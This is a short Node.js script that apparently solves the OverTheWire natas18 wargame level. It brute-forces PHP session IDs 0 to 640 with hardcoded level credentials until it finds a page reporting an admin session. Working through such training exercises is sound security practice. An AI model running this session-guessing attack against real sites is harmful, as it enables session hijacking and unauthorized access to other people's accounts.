var queue = require('queue-async');
var request = require('request');

var natas18 = 'http://natas18.natas.labs.overthewire.org/';
var natas18user = 'natas18';
var natas18pass = 'xvKIqDjy4OPv7wCRgDlmj0pFsCsDjhdP';

function callback(cb, error, response, body) {
  if (error) {
    return cb(error); 
  } else if (!error && response.statusCode >= 400) {
    return cb(body);
  } else if (!error && response.statusCode === 200) {
    if (body.indexOf('You are an admin') !== -1) {
      return cb(null, body);
    } else {
      return cb();
    }
  }
}

function doRequest(sessionId, next) {
  var jar = request.jar();
  var cookie = request.cookie('PHPSESSID=' + sessionId);

  jar.setCookie(cookie, natas18);

  var r = request.get(natas18, {
    auth: {
      'user': natas18user,
      'pass': natas18pass
    },
    timeout: 10000,
    jar: jar
  }, callback.bind(this, next));
}

var tasks = [];
for (var i=0, l=641; i<l; i+=1) {
  tasks.push(doRequest.bind(null, i));
}

var q = queue(1);
tasks.forEach(function(t) { q.defer(t); });
q.awaitAll(function(error, results) {
  if (error) { return console.error(error); }
  console.log(results);
});
